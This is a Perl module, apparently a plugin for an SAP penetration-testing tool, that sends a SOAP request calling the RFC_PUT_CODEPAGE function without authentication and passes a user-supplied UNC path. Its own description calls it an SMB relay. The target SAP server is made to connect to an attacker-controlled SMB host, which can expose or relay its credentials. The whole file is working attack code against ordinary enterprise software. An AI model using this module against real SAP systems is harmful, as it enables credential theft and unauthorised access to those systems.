#!/usr/bin/perl
# Module SMB relay RFC_PUT_CODEPAGE

# CONFIG
######################
my $desc ="No RFC Auth SMB relay (RFC_PUT_CODEPAGE) \n\t Usage: black.pl .. .. -m id_module <path> \n\t UNC path like this: \\\\192.168.0.101\n\n"; 
our $funcName="RFC_PUT_CODEPAGE_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub RFC_PUT_CODEPAGE_Func()
{
	
	my $path;
	my $XML='
	<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <RFC_PUT_CODEPAGE xmlns="urn:sap-com:document:sap:rfc:functions">
           <FROMPAGE>cdp_610</FROMPAGE>
           <PATHNAME>%PATH%</PATHNAME>
           <TOPAGE>cdp_610</TOPAGE>
        </RFC_PUT_CODEPAGE>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;

	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";
}